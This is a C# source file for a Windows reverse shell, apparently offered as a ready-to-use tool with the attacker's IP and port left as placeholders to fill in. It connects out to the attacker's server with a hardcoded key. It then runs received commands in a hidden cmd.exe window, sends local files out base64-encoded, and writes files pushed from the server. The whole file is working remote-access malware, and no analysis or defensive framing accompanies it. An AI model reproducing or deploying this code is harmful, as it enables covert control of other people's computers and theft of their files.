using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.IO;

class ReverseShell
{
    public static string currentDir = Directory.GetCurrentDirectory();

    static void Main()
    {
        try
        {
            int port = PORT; // #----fix-----
            string serverIP = "SERVER IP HERE"; // #----fix-----

            using (TcpClient client = new TcpClient())
            {
                client.Connect(serverIP, port);

                string secretKey = "35WUy#7,Me.ZykkdWk";
                byte[] secretBytes = Encoding.UTF8.GetBytes(secretKey + "\r\n");
                client.GetStream().Write(secretBytes, 0, secretBytes.Length);
                client.GetStream().Flush();


                using (Stream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                {
                    while (true)
                    {
                        string command = reader.ReadLine();

                        if (command.StartsWith("download "))
                        {
                            string fileName = command.Substring(9).Trim('"');
                            string filePath = Path.Combine(currentDir, fileName);

                            if (!File.Exists(filePath))
                            {
                                writer.Write($"[!] File not found: {fileName}<<<END>>>\n");
                                continue;
                            }

                            byte[] fileBytes = File.ReadAllBytes(filePath);
                            string base64 = Convert.ToBase64String(fileBytes);
                            writer.Write(base64 + "<<<END>>>\n");
                            continue;
                        }

                        if (command.StartsWith("upload "))
                        {
                            string fileName = command.Substring(7).Trim('"');
                            string b64data = "";
                            string line;

                            while ((line = reader.ReadLine()) != null)
                            {
                                if (line.EndsWith("<<<END>>>"))
                                {
                                    b64data += line.Replace("<<<END>>>", "");
                                    break;
                                }
                                b64data += line;
                            }

                            try
                            {
                                byte[] fileBytes = Convert.FromBase64String(b64data);
                                string fullPath = Path.Combine(currentDir, fileName);
                                File.WriteAllBytes(fullPath, fileBytes);
                                writer.Write($"[+] Uploaded {fileName} to {fullPath}<<<END>>>\n");
                            }
                            catch (Exception ex)
                            {
                                writer.Write($"[!] Upload failed: {ex.Message}<<<END>>>\n");
                            }

                            writer.Flush();
                            continue;
                        }

                        // Handle shell command
                        string output = ExecuteCommand(command);
                        writer.Write(output + "<<<END>>>\n");
                        writer.Flush();
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex);
        }
    }

    public static string ExecuteCommand(string cmd)
    {
        try
        {
            cmd = cmd.Trim();

            if (cmd.StartsWith("cd "))
            {
                string[] parts = cmd.Split(new[] { ' ' }, 2);
                if (parts.Length > 1)
                {
                    string targetDir = parts[1].Trim('"');
                    string newDir = Path.GetFullPath(Path.Combine(currentDir, targetDir));
                    if (Directory.Exists(newDir))
                    {
                        currentDir = newDir;
                        return $"[+] Changed directory to: {currentDir}";
                    }
                    else
                    {
                        return $"[!] Directory does not exist: {newDir}";
                    }
                }
                return "[!] Invalid cd command";
            }

            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.WorkingDirectory = currentDir;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.CreateNoWindow = true;

            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();
            output += proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            return output + $"\n[{currentDir}]>";
        }
        catch (Exception e)
        {
            return $"[!] Error executing command: {e.Message}";
        }
    }
}
